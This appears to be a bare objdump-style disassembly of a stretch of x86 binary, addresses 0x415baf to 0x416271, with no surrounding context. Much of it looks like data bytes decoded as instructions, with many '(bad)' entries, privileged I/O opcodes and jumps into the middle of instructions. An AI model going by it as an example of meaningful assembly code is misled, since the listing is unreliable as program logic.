  415baf:	add    eax,DWORD PTR [ecx-0x55]
  415bb2:	das    
  415bb3:	call   DWORD PTR [esi+0x7b]
  415bb6:	add    DWORD PTR [eax],eax
  415bb8:	xor    DWORD PTR [ebx+0x1],edi
  415bbb:	add    BYTE PTR [ecx],dh
  415bbd:	fwait
  415bbe:	sub    bh,bh
  415bc0:	ds aaa 
  415bc2:	sub    edi,edi
  415bc4:	ss mov bh,0x2c
  415bc7:	jmp    FWORD PTR [esi]
  415bc9:	jnp    0x415bcc
  415bcb:	add    BYTE PTR [ecx],dh
  415bcd:	jnp    0x415bd0
  415bcf:	add    BYTE PTR [ecx],dh
  415bd1:	pop    ebp
  415bd2:	sub    bh,bh
  415bd4:	push   ss
  415bd5:	or     ebp,DWORD PTR [esi]
  415bd7:	dec    DWORD PTR [esi]
  415bd9:	fwait
  415bda:	sub    al,0xff
  415bdc:	push   es
  415bdd:	jnp    0x415be0
  415bdf:	add    BYTE PTR [ecx],dh
  415be1:	jnp    0x415be4
  415be3:	add    BYTE PTR [ecx],dh
  415be5:	xor    esp,DWORD PTR [edi]
  415be7:	(bad)  
  415be8:	out    dx,al
  415be9:	push   esi
  415bea:	sub    edi,edi
  415bec:	out    0xd2,al
  415bee:	sub    edi,edi
  415bf0:	fidivr WORD PTR [edx+0x1]
  415bf3:	add    BYTE PTR [ecx],dh
  415bf5:	jnp    0x415bf8
  415bf7:	add    BYTE PTR [ecx],dh
  415bf9:	xlat   BYTE PTR ds:[ebx]
  415bfa:	es inc esi
  415bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfe:	sub    edi,edi
  415c00:	mov    esi,0xb6ff2a6e
  415c05:	jp     0x415c08
  415c07:	add    BYTE PTR [ecx],dh
  415c09:	jnp    0x415c0c
  415c0b:	add    BYTE PTR [eax],al
  415c0d:	add    BYTE PTR [ecx],dh
  415c0f:	jne    0x415c32
  415c11:	call   FWORD PTR [esi-0x6900d226]
  415c17:	dec    esi
  415c18:	sub    bh,bh
  415c1a:	mov    ?,WORD PTR [edx+0x1]
  415c1d:	add    BYTE PTR [ecx],dh
  415c1f:	jnp    0x415c22
  415c21:	add    BYTE PTR [ecx],dh
  415c23:	adc    al,0x27
  415c25:	and    al,0x76
  415c27:	jo     0x415bb8
  415c29:	sub    eax,0x2aff706e
  415c2e:	data16 jo 0x415c18
  415c31:	add    esi,DWORD PTR [ecx]
  415c33:	adc    al,0xe7
  415c35:	add    esi,DWORD PTR [ecx]
  415c37:	adc    al,0x59
  415c39:	and    ecx,DWORD PTR [esi+0x70]
  415c3c:	jnp    0x415c6b
  415c3e:	inc    esi
  415c3f:	jo     0x415c64
  415c41:	sub    edi,DWORD PTR [esi]
  415c43:	jo     0x415c2c
  415c45:	add    esi,DWORD PTR [ecx]
  415c47:	adc    al,0xe7
  415c49:	add    esi,DWORD PTR [ecx]
  415c4b:	adc    al,0xf9
  415c4d:	and    ah,BYTE PTR [esi]
  415c4f:	jo     0x415c08
  415c51:	sub    eax,0x2af7701e
  415c56:	push   ss
  415c57:	jo     0x415c40
  415c59:	add    esi,DWORD PTR [ecx]
  415c5b:	adc    al,0xe7
  415c5d:	add    esi,DWORD PTR [ecx]
  415c5f:	adc    al,0x25
  415c61:	and    edi,esi
  415c63:	outs   dx,DWORD PTR ds:[esi]
  415c64:	arpl   WORD PTR ds:0x3e76ff6,bp
  415c6a:	xor    DWORD PTR [edi+eiz*8],edx
  415c6d:	add    esi,DWORD PTR [ecx]
  415c6f:	adc    al,0xe7
  415c71:	add    eax,DWORD PTR [eax]
  415c73:	add    BYTE PTR [ecx],dh
  415c75:	adc    al,0xe7
  415c77:	add    esi,DWORD PTR [ecx]
  415c79:	adc    al,0xe7
  415c7b:	add    esi,DWORD PTR [ecx]
  415c7d:	adc    al,0xdf
  415c7f:	sub    al,0xc6
  415c81:	outs   dx,DWORD PTR ds:[esi]
  415c82:	aad    0x2c
  415c84:	mov    esi,0xb62cc96f
  415c89:	outs   dx,DWORD PTR ds:[esi]
  415c8a:	xlat   BYTE PTR ds:[ebx]
  415c8b:	sub    al,0xae
  415c8d:	outs   dx,DWORD PTR ds:[esi]
  415c8e:	shr    DWORD PTR [esi+eiz*4],cl
  415c91:	outs   dx,DWORD PTR ds:[esi]
  415c92:	lahf   
  415c93:	sub    al,0x9e
  415c95:	outs   dx,DWORD PTR ds:[esi]
  415c96:	popf   
  415c97:	sub    al,0x96
  415c99:	outs   dx,DWORD PTR ds:[esi]
  415c9a:	test   DWORD PTR [esi+ecx*4],ebp
  415c9d:	outs   dx,DWORD PTR ds:[esi]
  415c9e:	add    BYTE PTR [ebx+0x55],bh
  415ca1:	outs   dx,DWORD PTR ds:[esi]
  415ca2:	std    
  415ca3:	imul   ecx,DWORD PTR [ebp+0x6f],0x6f4a75fd
  415caa:	std    
  415cab:	sbb    DWORD PTR [edx],0x1a87fd6f
  415cb1:	outs   dx,DWORD PTR ds:[esi]
  415cb2:	std    
  415cb3:	mov    ds:0xa1fd6f0a,eax
  415cb8:	or     ch,BYTE PTR [edi-0x3]
  415cbb:	iret   
  415cbc:	sbb    ch,BYTE PTR [edi-0x3]
  415cbf:	mov    bh,0x1a
  415cc1:	outs   dx,DWORD PTR ds:[esi]
  415cc2:	std    
  415cc3:	fst    DWORD PTR [esi]
  415cc5:	outs   dx,DWORD PTR ds:[esi]
  415cc6:	std    
  415cc7:	leave  
  415cc8:	push   cs
  415cc9:	outs   dx,DWORD PTR ds:[esi]
  415cca:	std    
  415ccb:	fist   DWORD PTR [esi+0x6f]
  415cce:	std    
  415ccf:	sub    ebx,DWORD PTR [ecx+0x6f]
  415cd2:	std    
  415cd3:	aaa    
  415cd4:	dec    ecx
  415cd5:	outs   dx,DWORD PTR ds:[esi]
  415cd6:	std    
  415cd7:	or     eax,0x6f490000
  415cdc:	std    
  415cdd:	add    DWORD PTR [ecx+0x6f],ebx
  415ce0:	std    
  415ce1:	addr16 pop ecx
  415ce3:	outs   dx,DWORD PTR ds:[esi]
  415ce4:	std    
  415ce5:	dec    ecx
  415ce6:	dec    ecx
  415ce7:	outs   dx,DWORD PTR ds:[esi]
  415ce8:	std    
  415ce9:	xchg   ebp,eax
  415cea:	dec    ecx
  415ceb:	outs   dx,DWORD PTR ds:[esi]
  415cec:	std    
  415ced:	popf   
  415cee:	sbb    DWORD PTR [edi-0x3],ebp
  415cf1:	and    DWORD PTR [ecx],ebx
  415cf3:	outs   dx,DWORD PTR ds:[esi]
  415cf4:	std    
  415cf5:	sub    eax,0x55fd6f09
  415cfa:	or     DWORD PTR [edi-0x3],ebp
  415cfd:	aas    
  415cfe:	sbb    DWORD PTR [edi-0x3],ebp
  415d01:	out    0x19,eax
  415d03:	outs   dx,DWORD PTR ds:[esi]
  415d04:	std    
  415d05:	pop    es
  415d06:	or     BYTE PTR [edi-0x3],ch
  415d09:	stos   DWORD PTR es:[edi],eax
  415d0a:	or     DWORD PTR [edi-0x3],ebp
  415d0d:	ret    
  415d0e:	pop    ecx
  415d0f:	outs   dx,DWORD PTR ds:[esi]
  415d10:	std    
  415d11:	(bad)  
  415d12:	pop    ecx
  415d13:	outs   dx,DWORD PTR ds:[esi]
  415d14:	std    
  415d15:	popa   
  415d16:	dec    eax
  415d17:	outs   dx,DWORD PTR ds:[esi]
  415d18:	std    
  415d19:	add    al,ch
  415d1b:	cmp    al,0xfd
  415d1d:	push   eax
  415d1f:	cmp    al,0xfd
  415d21:	call   DWORD PTR [ebp+edi*1-0x3]
  415d25:	jmp    DWORD PTR [edx]
  415d27:	cmp    eax,0x3b62fffd
  415d2c:	std    
  415d2d:	dec    DWORD PTR [edx+0x50fffd3b]
  415d33:	cmp    ch,bh
  415d35:	jmp    DWORD PTR [eax+0x38]
  415d38:	std    
  415d39:	call   DWORD PTR [eax+edi*1-0x3]
  415d3d:	inc    DWORD PTR [eax]
  415d3f:	add    BYTE PTR [esi],dl
  415d41:	ss std 
  415d43:	jmp    DWORD PTR [esi+esi*1]
  415d46:	std    
  415d47:	push   esp
  415d49:	xor    eax,0x3614fffd
  415d4e:	std    
  415d4f:	call   FWORD PTR [edx+0x18fffd37]
  415d55:	adc    al,BYTE PTR [eax]
  415d57:	add    BYTE PTR [esi+0x37],bl
  415d5a:	std    
  415d5b:	inc    esi
  415d5d:	aaa    
  415d5e:	std    
  415d5f:	jmp    FWORD PTR [esi-0x510002c9]
  415d65:	aaa    
  415d66:	std    
  415d67:	dec    DWORD PTR [esi-0x50002c9]
  415d6d:	ss std 
  415d6f:	(bad)  
  415d70:	fcom   DWORD PTR [ecx]
  415d72:	add    BYTE PTR [eax],al
  415d74:	sub    al,0x35
  415d76:	std    
  415d77:	dec    eax
  415d79:	adc    DWORD PTR [eax],eax
  415d7b:	add    BYTE PTR [esi+esi*1+0x36a4fffd],al
  415d82:	std    
  415d83:	push   eax
  415d85:	ss std 
  415d87:	inc    DWORD PTR [esi+0x44fffd36]
  415d8d:	ss std 
  415d8f:	jmp    DWORD PTR [esi+esi*1]
  415d92:	std    
  415d93:	push   DWORD PTR [ecx]
  415d95:	fbld   TBYTE PTR ds:0x25c59eff
  415d9b:	call   DWORD PTR [esi-0x7100d9c3]
  415da1:	mov    tr7,edi
  415da4:	add    BYTE PTR [eax],al
  415da6:	xchg   BYTE PTR [ebx+0x1],bh
  415da9:	add    BYTE PTR [ecx],dh
  415dab:	popa   
  415dac:	and    edi,edi
  415dae:	jbe    0x415e2b
  415db0:	add    DWORD PTR [eax],eax
  415db2:	xor    DWORD PTR [ebp+0x21],esp
  415db5:	jmp    DWORD PTR [esi+0x11]
  415db8:	and    al,0xff
  415dba:	pop    esi
  415dbb:	jnp    0x415dbe
  415dbd:	add    BYTE PTR [ecx],dh
  415dbf:	daa    
  415dc0:	and    al,0xff
  415dc2:	dec    esi
  415dc3:	xor    esp,DWORD PTR [edi+edi*8]
  415dc6:	inc    esi
  415dc7:	fbld   TBYTE PTR [ebx]
  415dc9:	(bad)  
  415dca:	sub    esp,DWORD PTR ds:[edi+edi*8]
  415dce:	xor    DWORD PTR ss:[edi+edi*8],esp
  415dd2:	cs cmc 
  415dd4:	and    edi,edi
  415dd6:	es jnp 0x415dda
  415dd9:	add    BYTE PTR [ecx],dh
  415ddb:	std    
  415ddc:	and    edi,edi
  415dde:	push   ss
  415ddf:	shl    DWORD PTR [ebx],0xff
  415de2:	push   cs
  415de3:	shl    DWORD PTR [ebx],1
  415de5:	inc    DWORD PTR [esi]
  415de7:	mov    edi,0x8cfeff24
  415dec:	and    al,0xff
  415dee:	not    dh
  415df0:	and    edi,edi
  415df2:	out    dx,al
  415df3:	(bad)  
  415df4:	and    edi,edi
  415df6:	out    0xd4,al
  415df8:	and    edi,edi
  415dfa:	faddp  st(4),st
  415dfc:	and    edi,edi
  415dfe:	(bad)  
  415dff:	jle    0x415e23
  415e01:	dec    esi
  415e03:	jp     0x415e06
  415e05:	add    BYTE PTR [ecx],dh
  415e07:	inc    ebp
  415e08:	and    bh,bh
  415e0a:	add    BYTE PTR [eax],al
  415e0c:	mov    esi,0xb6ff2268
  415e11:	adc    esp,edi
  415e13:	add    esi,DWORD PTR [ecx]
  415e15:	adc    al,0xef
  415e17:	sub    BYTE PTR [esi-0x61d70294],ah
  415e1d:	ins    BYTE PTR es:[edi],dx
  415e1e:	leave  
  415e1f:	sub    BYTE PTR [esi-0x71d74894],dl
  415e25:	ins    BYTE PTR es:[edi],dx
  415e26:	mov    ebx,0x9f6c8628
  415e2b:	sub    BYTE PTR [esi+0x6c],bh
  415e2e:	xchg   ebp,eax
  415e2f:	sub    BYTE PTR [esi+0x6c],dh
  415e32:	dec    ebp
  415e33:	sub    DWORD PTR [esi+0x6c],ebp
  415e36:	pop    ecx
  415e37:	sub    DWORD PTR [esi+0x6c],esp
  415e3a:	sub    BYTE PTR [bp+0x6c],bl
  415e3e:	pop    ebx
  415e3f:	sub    BYTE PTR [esi+0x6c],dl
  415e42:	pop    edi
  415e43:	sub    BYTE PTR [esi+0x6c],cl
  415e46:	lea    ebp,[eax]
  415e48:	inc    esi
  415e49:	ins    BYTE PTR es:[edi],dx
  415e4a:	mov    eax,ds:0x8f6c3e28
  415e4f:	sub    BYTE PTR [esi],dh
  415e51:	ins    BYTE PTR es:[edi],dx
  415e52:	xchg   ebp,eax
  415e53:	sub    BYTE PTR [esi],ch
  415e55:	ins    BYTE PTR es:[edi],dx
  415e56:	popf   
  415e57:	sub    BYTE PTR [esi],ah
  415e59:	ins    BYTE PTR es:[edi],dx
  415e5a:	mul    DWORD PTR [edi]
  415e5c:	push   ds
  415e5d:	ins    BYTE PTR es:[edi],dx
  415e5e:	(bad)  
  415e5f:	daa    
  415e60:	push   ss
  415e61:	ins    BYTE PTR es:[edi],dx
  415e62:	mov    ecx,0x296c0e27
  415e67:	sub    BYTE PTR [esi],al
  415e69:	ins    BYTE PTR es:[edi],dx
  415e6a:	sbb    eax,0x36bfe28
  415e6f:	sub    BYTE PTR [eax],al
  415e71:	add    dh,dh
  415e73:	imul   ebx,edi,0x27
  415e76:	out    dx,al
  415e77:	imul   ebp,DWORD PTR [ebp+0x27],0xffffffe6
  415e7b:	imul   eax,DWORD PTR [edi+0x7b6bde27],0x27
  415e82:	(bad)  
  415e83:	imul   eax,DWORD PTR [ebx+0x2f6bce27],0x27
  415e8a:	(bad)  
  415e8b:	imul   eax,DWORD PTR [eax],0x15
  415e8e:	push   ss
  415e8f:	imul   edi,ebp,0x3d
  415e92:	push   cs
  415e93:	imul   edi,ebp,0x27
  415e96:	push   esi
  415e97:	imul   edi,ebp,0xffffffef
  415e9a:	dec    edi
  415e9b:	imul   edi,ebp,0xffffffcf
  415e9e:	push   edi
  415e9f:	imul   edi,ebp,0xffffffab
  415ea2:	dec    edi
  415ea3:	imul   edi,ebp,0xffffffa3
  415ea6:	push   edi
  415ea7:	imul   edi,ebp,0xffffff87
  415eaa:	dec    edi
  415eab:	imul   edi,ebp,0x61
  415eae:	push   edi
  415eaf:	imul   edi,ebp,0x49
  415eb2:	dec    edi
  415eb3:	imul   edi,ebp,0xffffffa1
  415eb6:	push   eax
  415eb7:	push   0xfffffffd
  415eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eba:	push   eax
  415ebb:	push   0xfffffffd
  415ebd:	mov    bl,0x50
  415ebf:	push   0xfffffffd
  415ec1:	ret    
  415ec2:	push   eax
  415ec3:	push   0xfffffffd
  415ec5:	mov    ebx,0xf1fd6a50
  415eca:	push   eax
  415ecb:	push   0xfffffffd
  415ecd:	rcl    DWORD PTR [eax+0x6a],1
  415ed0:	std    
  415ed1:	cmc    
  415ed2:	push   eax
  415ed3:	push   0xfffffffd
  415ed5:	das    
  415ed6:	add    BYTE PTR [eax],al
  415ed8:	adc    ebp,DWORD PTR [edx-0x3]
  415edb:	xor    eax,0xdfd6a13
  415ee0:	adc    ebp,DWORD PTR [edx-0x3]
  415ee3:	adc    eax,0x6bfd6a13
  415ee8:	adc    ebp,DWORD PTR [edx-0x3]
  415eeb:	jmp    0x47417322
  415ef0:	adc    ebp,DWORD PTR [edx-0x3]
  415ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef4:	adc    ebp,DWORD PTR [edx-0x3]
  415ef7:	inc    edi
  415ef8:	shr    DWORD PTR [ecx-0x3],cl
  415efb:	dec    edi
  415efc:	shr    DWORD PTR [ecx-0x3],cl
  415eff:	push   edi
  415f00:	shr    DWORD PTR [ecx-0x3],cl
  415f03:	sti    
  415f04:	shr    DWORD PTR [ecx-0x3],cl
  415f07:	add    al,bl
  415f09:	push   ss
  415f0a:	add    BYTE PTR [eax],al
  415f0c:	xor    al,0x77
  415f0e:	(bad)  
  415f0f:	dec    eax
  415f11:	push   ss
  415f12:	add    BYTE PTR [eax],al
  415f14:	mov    WORD PTR [ebp-0x2],?
  415f17:	(bad)  
  415f18:	in     al,dx
  415f19:	jne    0x415f19
  415f1b:	inc    eax
  415f1d:	jne    0x415f1d
  415f1f:	(bad)  
  415f20:	mov    esi,0xcfffe75
  415f25:	ja     0x415f25
  415f27:	(bad)  
  415f28:	in     al,dx
  415f29:	jbe    0x415f29
  415f2b:	(bad)  
  415f2c:	in     al,dx
  415f2d:	jbe    0x415f2d
  415f2f:	(bad)  
  415f30:	ds ja  0x415f31
  415f33:	dec    DWORD PTR [esi+0x77]
  415f36:	(bad)  
  415f37:	push   DWORD PTR [ebp+esi*2-0x2]
  415f3b:	inc    DWORD PTR [eax]
  415f3d:	add    BYTE PTR [eax+0x16],bl
  415f40:	add    BYTE PTR [eax],al
  415f42:	xor    BYTE PTR [ebp-0x2],0xff
  415f46:	dec    eax
  415f47:	push   ss
  415f48:	add    BYTE PTR [eax],al
  415f4a:	outs   dx,BYTE PTR ds:[esi]
  415f4b:	jbe    0x415f4b
  415f4d:	jmp    DWORD PTR [edx]
  415f4f:	jo     0x415f4f
  415f51:	dec    DWORD PTR [eax+0x16]
  415f54:	add    BYTE PTR [eax],al
  415f56:	adc    al,0x70
  415f58:	(bad)  
  415f59:	push   DWORD PTR [eax+0x70]
  415f5c:	(bad)  
  415f5d:	jmp    FWORD PTR [eax+esi*2]
  415f60:	(bad)  
  415f61:	(bad)  
  415f62:	cmp    BYTE PTR [eax-0x2],dh
  415f65:	inc    DWORD PTR [edx+0x70]
  415f68:	(bad)  
  415f69:	call   FWORD PTR [esi+0x18fffe75]
  415f6f:	push   ss
  415f70:	add    BYTE PTR [eax],al
  415f72:	data16 jne 0x415f73
  415f75:	push   DWORD PTR [edx+0x75]
  415f78:	(bad)  
  415f79:	call   DWORD PTR [edx+0xcfffe75]
  415f7f:	jne    0x415f7f
  415f81:	push   DWORD PTR [ecx]
  415f83:	xor    ecx,esp
  415f85:	(bad)  
  415f86:	(bad)  
  415f87:	aaa    
  415f88:	loope  0x415f88
  415f8a:	into   
  415f8b:	xlat   BYTE PTR ds:[ebx]
  415f8c:	loopne 0x415f8c
  415f8e:	(bad)  
  415f8f:	fchs   
  415f91:	(bad)  
  415f92:	mov    esi,0xb6fee129
  415f97:	outs   dx,DWORD PTR ds:[esi]
  415f98:	in     al,0xfe
  415f9a:	scas   al,BYTE PTR es:[edi]
  415f9b:	jnp    0x415f9e
  415f9d:	add    BYTE PTR [ecx],dh
  415f9f:	imul   esp,esp,0x9e0000fe
  415fa5:	dec    ebp
  415fa6:	in     al,0xfe
  415fa8:	xchg   esi,eax
  415fa9:	jnp    0x415fac
  415fab:	add    BYTE PTR [ecx],dh
  415fad:	push   eax
  415fae:	add    DWORD PTR [ecx+0x3],eax
  415fb1:	nop
  415fb2:	in     al,0x73
  415fb4:	adc    al,0xb9
  415fb6:	in     al,dx
  415fb7:	imul   ecx,DWORD PTR [esp+edi*4],0x1
  415fbb:	aas    
  415fbc:	xor    ebp,DWORD PTR ds:0x30cd5ee5
  415fc2:	jmp    0x1bc3432
  415fc7:	and    DWORD PTR [ecx],esi
  415fc9:	ds lock ins BYTE PTR es:[edi],dx
  415fcc:	ret    0xcbd7
  415fcf:	pop    esi
  415fd0:	xlat   BYTE PTR ds:[ebx]
  415fd1:	into   
  415fd2:	out    dx,eax
  415fd3:	bound  esi,QWORD PTR [ecx]
  415fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd6:	push   es
  415fd7:	push   ebp
  415fd8:	ret    
  415fd9:	shl    edi,cl
  415fdb:	bound  esi,QWORD PTR [edi+0x4]
  415fde:	lock bound esi,QWORD PTR [ecx]
  415fe1:	push   0x7a26c04
  415fe6:	imul   BYTE PTR [ebx-0x74]
  415fe9:	imul   eax,edx,0x12b0eff
  415fef:	inc    ebp
  415ff0:	xchg   ebp,eax
  415ff1:	sbb    ah,dh
  415ff3:	pop    esi
  415ff4:	lea    ebp,[edi]
  415ff6:	out    dx,eax
  415ff7:	pusha  
  415ff8:	mov    bh,BYTE PTR [ebx+0x1]
  415ffb:	mov    ch,0x30
  415ffd:	adc    al,0xae
  415fff:	out    dx,eax
  416000:	push   ebp
  416001:	test   bh,0xef
  416004:	cmp    edx,0xffffffc2
  416007:	lock add BYTE PTR [eax],al
  41600a:	push   ecx
  41600b:	std    
  41600c:	out    0x3,al
  41600e:	lds    edx,FWORD PTR [edx]
  416010:	mov    bl,0xf0
  416012:	push   ecx
  416013:	repz retf 0x40c9
  416017:	out    dx,eax
  416018:	retf   
  416019:	add    eax,ecx
  41601b:	adc    bl,BYTE PTR [ebx-0x6d0cee10]
  416021:	ret    0xf81a
  416024:	(bad)  
  416025:	in     al,0x9e
  416027:	push   0xe50504f0
  41602c:	xchg   edx,eax
  41602d:	cmc    
  41602e:	adc    esp,esp
  416030:	jg     0x415ff4
  416032:	xchg   BYTE PTR [eax-0x26],ch
  416035:	add    al,0xd
  416037:	in     eax,0x7a
  416039:	cmc    
  41603a:	adc    ebx,esi
  41603c:	jb     0x416000
  41603e:	outs   dx,BYTE PTR ds:[esi]
  41603f:	push   0xeeec02fe
  416044:	push   edx
  416045:	retf   0xf7d7
  416048:	dec    ebx
  416049:	ret    
  41604a:	loop   0x41602b
  41604c:	pop    eax
  41604d:	jmp    0x41601f
  41604f:	fidivr WORD PTR [edx]
  416051:	out    0xc1,eax
  416053:	shl    dh,cl
  416055:	add    ebx,DWORD PTR [edx-0x3903d3ed]
  41605b:	repnz cmp al,0xe8
  41605e:	jae    0x416056
  416060:	sbb    al,0xeb
  416062:	mov    al,ds:0x93ef0cf7
  416067:	neg    BYTE PTR [edx]
  416069:	aad    0xa2
  41606b:	loop   0x41606c
  41606d:	icebp  
  41606e:	add    BYTE PTR [eax],al
  416070:	xchg   ebp,eax
  416071:	jecxz  0x41609a
  416073:	add    al,0x25
  416075:	adc    eax,0xce82e726
  41607a:	(bad)  
  41607b:	inc    DWORD PTR [ecx]
  41607d:	repz push eax
  41607f:	add    bh,ch
  416081:	bnd jmp DWORD PTR [esi]
  416084:	sub    eax,0xd3c471d5
  416089:	jecxz  0x4160ed
  41608b:	scas   eax,DWORD PTR es:[edi]
  41608c:	retf   
  41608d:	sti    
  41608e:	bound  ebx,QWORD PTR [ebx+edx*8-0x3f2f9009]
  416095:	lock ds jmp 0xa44374ce
  41609c:	shl    edi,cl
  41609e:	push   ebp
  41609f:	rcl    BYTE PTR [edi+0x788f4ce0],0xee
  4160a6:	imul   eax,DWORD PTR [edx+esi*1-0x5f43fdbb],0xfffffffa
  4160ae:	pop    esi
  4160af:	cdq    
  4160b0:	push   0x617e62ee
  4160b5:	icebp  
  4160b6:	inc    ebp
  4160b7:	nop
  4160b8:	mov    ?,edx
  4160ba:	inc    DWORD PTR [edx]
  4160bc:	xor    ebx,eax
  4160be:	ins    BYTE PTR es:[edi],dx
  4160bf:	mov    BYTE PTR [esi-0x25],dl
  4160c2:	dec    bx
  4160c4:	arpl   si,ax
  4160c6:	jno    0x416128
  4160c8:	je     0x416131
  4160ca:	std    
  4160cb:	cmp    ch,BYTE PTR [ecx+edx*8]
  4160ce:	bound  edx,QWORD PTR [ebp+0x65]
  4160d1:	in     eax,0x6c
  4160d3:	dec    edx
  4160d4:	add    BYTE PTR [eax],al
  4160d6:	ins    BYTE PTR es:[edi],dx
  4160d7:	repz arpl WORD PTR [ebx],di
  4160da:	dec    eax
  4160db:	in     al,0x70
  4160dd:	jmp    0x2640f114
  4160e2:	sbb    bl,ah
  4160e4:	push   ebx
  4160e5:	or     al,0x20
  4160e7:	test   DWORD PTR [edi+0x8],0xe93eef19
  4160ee:	xor    ah,BYTE PTR [ebx]
  4160f0:	add    BYTE PTR [edx],ch
  4160f2:	add    esi,edx
  4160f4:	pop    esi
  4160f5:	add    BYTE PTR [esp+edi*2],al
  4160f8:	inc    ecx
  4160f9:	imul   edi,edx,0x2f74607b
  4160ff:	bound  esi,QWORD PTR [esi+0x41]
  416102:	fcom   DWORD PTR [edx]
  416104:	add    BYTE PTR gs:[ebx+edi*2+0x7c046569],dl
  41610c:	inc    ebx
  41610d:	imul   ebp,esp,0xd8003e7b
  416113:	cmovae esp,DWORD PTR [ebp-0x7c]
  416117:	push   ecx
  416118:	jb     0x41618c
  41611a:	jp     0x416197
  41611c:	imul   esi,DWORD PTR [eax+ebx*4+0x64],0x6c
  416121:	arpl   WORD PTR [ebp+0x61],si
  416124:	jo     0x416126
  416126:	dec    eax
  416127:	adc    dl,BYTE PTR [ebx+0x69]
  41612a:	mov    ah,0x7b
  41612c:	inc    eax
  41612d:	push   0x6f5164a9
  416132:	lods   eax,DWORD PTR ds:[esi]
  416133:	imul   ebp,DWORD PTR [ecx+0x74],0xffffffa1
  416137:	push   esp
  416138:	jbe    0x4161ae
  41613a:	add    BYTE PTR [eax],al
  41613c:	mov    ch,0x12
  41613e:	lods   eax,DWORD PTR ds:[esi]
  41613f:	add    dh,al
  416141:	ja     0x4161ae
  416143:	fs xchg esi,eax
  416145:	ja     0x4161b6
  416147:	jae    0x41614d
  416149:	dec    esi
  41614a:	data16 ins BYTE PTR es:[edi],dx
  41614c:	cmc    
  41614d:	push   eax
  41614e:	std    
  41614f:	call   DWORD PTR [edi+0x11]
  416152:	ins    BYTE PTR es:[edi],dx
  416153:	jae    0x416139
  416155:	popa   
  416156:	pusha  
  416157:	ins    DWORD PTR es:[edi],dx
  416158:	or     BYTE PTR [ecx+0x3e],bh
  41615b:	add    BYTE PTR [edx-0x1196b9ee],dh
  416161:	jnp    0x4161ae
  416163:	gs pusha 
  416165:	ins    BYTE PTR es:[edi],dx
  416166:	inc    ebx
  416167:	imul   edi,DWORD PTR [ebx+edi*2],0x116d003e
  41616e:	inc    esi
  41616f:	imul   esi,DWORD PTR [ecx],0x9d40e80d
  416175:	repnz bound si,DWORD PTR [ecx]
  416179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41617a:	add    al,0x45
  41617c:	xchg   esp,eax
  41617d:	pop    edi
  41617e:	shr    BYTE PTR [ebp+ecx*4+0x68],1
  416182:	in     eax,dx
  416183:	bound  edi,QWORD PTR [ecx+0x1c]
  416186:	out    dx,al
  416187:	arpl   WORD PTR [ebp+0x58],dx
  41618a:	(bad)  
  41618b:	(bad)  
  41618c:	(bad)  
  41618e:	add    eax,DWORD PTR [ebp+0x4c]
  416191:	inc    edi
  416192:	shl    DWORD PTR [edx+0x43],cl
  416195:	dec    edx
  416196:	in     al,dx
  416197:	ins    BYTE PTR es:[edi],dx
  416198:	push   edi
  416199:	mov    eax,0x1313ef9
  41619e:	add    eax,DWORD PTR [ebp+0x0]
  4161a1:	add    BYTE PTR [edi+eiz*4-0x33],cl
  4161a5:	ins    BYTE PTR es:[edi],dx
  4161a6:	adc    bl,BYTE PTR [ebp+ebp*8+0x62]
  4161aa:	clc    
  4161ab:	jl     0x416190
  4161ad:	ins    BYTE PTR es:[edi],dx
  4161ae:	lock jp 0x4161b2
  4161b1:	je     0x4161e3
  4161b3:	mov    dh,0xe8
  4161b5:	jae    0x416199
  4161b7:	xor    edx,0x73
  4161ba:	or     al,0x80
  4161bc:	int3   
  4161bd:	ins    DWORD PTR es:[edi],dx
  4161be:	pop    ss
  4161bf:	xchg   esi,eax
  4161c0:	add    DWORD PTR [eax+0x73e8b630],esp
  4161c6:	push   es
  4161c7:	xchg   esp,eax
  4161c8:	jmp    0x41622d
  4161ca:	(bad)  
  4161cb:	(bad)
  4161ce:	enter  0xe4c8,0x60
  4161d2:	(bad)  
  4161d4:	icebp  
  4161d5:	jbe    0x4161c7
  4161d7:	jp     0x4161da
  4161d9:	dec    ebp
  4161da:	xor    BYTE PTR [esi],dh
  4161dc:	in     eax,0x73
  4161de:	loope  0x416208
  4161e0:	jmp    0xe568325a
  4161e5:	dec    edi
  4161e6:	mov    ds:0x9566e626,eax
  4161eb:	adc    al,0xc
  4161ed:	shl    DWORD PTR [edx-0x7211f01e],1
  4161f3:	shl    esi,cl
  4161f5:	add    ecx,DWORD PTR [ebx-0x7d18c5ee]
  4161fb:	sar    ebx,1
  4161fd:	icebp  
  4161fe:	sub    bh,0xc
  416201:	clc    
  416202:	jb     0x4161ff
  416204:	clc    
  416205:	out    0x0,al
  416207:	add    BYTE PTR [ecx-0x20],dl
  41620a:	std    
  41620b:	icebp  
  41620c:	pop    edi
  41620d:	shl    esi,cl
  41620f:	add    eax,DWORD PTR [edx+0x11]
  416212:	retf   
  416213:	lock (bad) 
  416216:	leave  
  416217:	out    dx,al
  416218:	pop    esi
  416219:	shl    esi,cl
  41621b:	add    esi,DWORD PTR [ebp+0x13]
  41621e:	scas   al,BYTE PTR es:[edi]
  41621f:	out    0x42,al
  416221:	les    edi,FWORD PTR [eax-0x450cc316]
  416227:	out    0xfe,al
  416229:	loope  0x4161e8
  41622b:	in     eax,0xf
  41622d:	clc    
  41622e:	mov    edx,eax
  416230:	adc    esi,ecx
  416232:	xchg   edx,eax
  416233:	jmp    0xef1b:0xe2a4f605
  41623a:	cdq    
  41623b:	ret    0x6486
  41623e:	mov    al,0x2
  416240:	hlt    
  416241:	out    dx,al
  416242:	jb     0x416217
  416244:	add    bl,bh
  416246:	jl     0x41622a
  416248:	loop   0x416238
  41624a:	xchg   esi,eax
  41624b:	icebp  
  41624c:	aad    0xed
  41624e:	dec    edi
  41624f:	lock rcr edx,cl
  416252:	dec    esp
  416253:	clc    
  416254:	pop    ss
  416255:	adc    al,0xd5
  416257:	add    esi,esp
  416259:	out    dx,al
  41625a:	push   edx
  41625b:	rol    ebx,0xe1
  41625e:	cmp    bh,ah
  416260:	int3   
  416261:	fbld   TBYTE PTR [edx]
  416263:	jmp    0x416225
  416265:	out    dx,al
  416266:	dec    DWORD PTR [ecx+0x29]
  416269:	icebp  
  41626a:	jno    0x41629c
  41626c:	add    BYTE PTR [eax],al
  41626e:	repnz arpl bp,di
  416271:	pop    es
